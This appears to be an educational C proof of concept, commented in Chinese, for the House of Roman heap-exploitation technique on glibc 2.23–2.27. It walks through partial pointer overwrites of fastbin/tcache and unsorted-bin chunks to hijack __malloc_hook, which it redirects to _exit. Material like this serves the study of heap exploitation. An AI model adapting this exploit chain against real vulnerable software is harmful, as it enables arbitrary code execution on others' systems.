/*
 * House of Roman 演示，glibc 2.23～2.27，x86-64。
 *
 * 模拟漏洞：UAF/堆溢出，可以改写 fastbin/tcache 与 unsorted bin
 * 指针的低一到两字节。整条链分三步：
 *   1. 把 0x70 单链改到 __malloc_hook 附近；
 *   2. 用 unsorted-bin attack 往 hook 写入 main_arena 指针；
 *   3. 再把指针的低字节改到 _exit。
 *
 * PoC 用 dlsym 计算正确字节，只为了让回归稳定。真实无泄漏场景
 * 需要爆破约 12 位 ASLR，理论成功率约为 1/4096。glibc 2.28 的
 * bdc3009 增加 bck->fd==victim 检查，第二步从此失效。
 *
 * 原始文章：
 * https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <gnu/libc-version.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(void) {
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);

	const char *dot = strchr(gnu_get_libc_version(), '.');
	int tcache = dot && atoi(dot + 1) >= 26;
	void *tc70[7];
	void *tc90[7];
	uintptr_t hook = (uintptr_t)dlsym(RTLD_NEXT, "__malloc_hook");
	uintptr_t exit_fn = (uintptr_t)dlsym(RTLD_NEXT, "_exit");
	if (!hook || !exit_fn)
		return 1;

	/* 第一步：fast 释放后原本指向 next。只改最低字节，将它
	 * 改为指向 libc_chunk；该块刚从 unsorted bin 切出，用户区仍
	 * 留有 main_arena 指针。
	 */
	uint8_t *fast = malloc(0x60);
	malloc(0x80); // 对齐块，让 next 与 libc_chunk 只有最低字节不同。
	uint8_t *arena = malloc(0x80);
	uint8_t *next = malloc(0x60);

	if (tcache) {
		for (int i = 0; i < 7; i++) {
			tc70[i] = malloc(0x60);
			tc90[i] = malloc(0x80);
		}
		for (int i = 0; i < 7; i++)
			free(tc90[i]);
	}

	free(arena);
	uint8_t *libc_chunk = malloc(0x60);
	printf("[i] arena→hook 差值=%#lx\n",
	       (unsigned long)(hook - *(uintptr_t *)libc_chunk));

	if (tcache)
		free(tc70[0]); // 让后面的 tcache count 也恰好为 3。
	free(next);
	free(fast);

	// UAF：fast -> libc_chunk -> (__malloc_hook 附近)。
	fast[0] = tcache ? (uintptr_t)libc_chunk : (uintptr_t)libc_chunk - 0x10;
	uintptr_t fake = hook - (tcache ? 0x13 : 0x23);
	libc_chunk[0] = fake;
	libc_chunk[1] = fake >> 8;

	malloc(0x60);
	malloc(0x60);
	uint8_t *hook_chunk = malloc(0x60);

	/* 第二步：让一个 0x90 chunk 进 unsorted bin，再把它的 bk 低
	 * 两字节改到 __malloc_hook-0x10。摘链时的 bck->fd 写入会把
	 * main_arena 指针送到 hook。
	 */
	if (tcache)
		for (int i = 0; i < 7; i++)
			tc90[i] = malloc(0x80);

	uint8_t *unsorted = malloc(0x80);
	malloc(0x30); // 保护块防止与 top 合并。

	if (tcache)
		for (int i = 0; i < 7; i++)
			free(tc90[i]);
	free(unsorted);

	fake = hook - 0x10;
	unsorted[8] = fake;
	unsorted[9] = fake >> 8;

	/* 2.26～2.27 要保持 0x90 tcache 已满；calloc 不走 tcache-get，
	 * 且会在写入后立即返回 exact-size victim。
	 */
	if (tcache)
		calloc(1, 0x80);
	else
		malloc(0x80);

	// 第三步：将 hook 中指针的低 4 字节相对改到 _exit。
	for (int i = 0; i < 4; i++)
		hook_chunk[19 + i] = exit_fn >> (8 * i);

	puts("[i] 触发 __malloc_hook");
	malloc(0);
	_exit(1); // 如果 hook 没有生效，禁止意外返回成功。
}
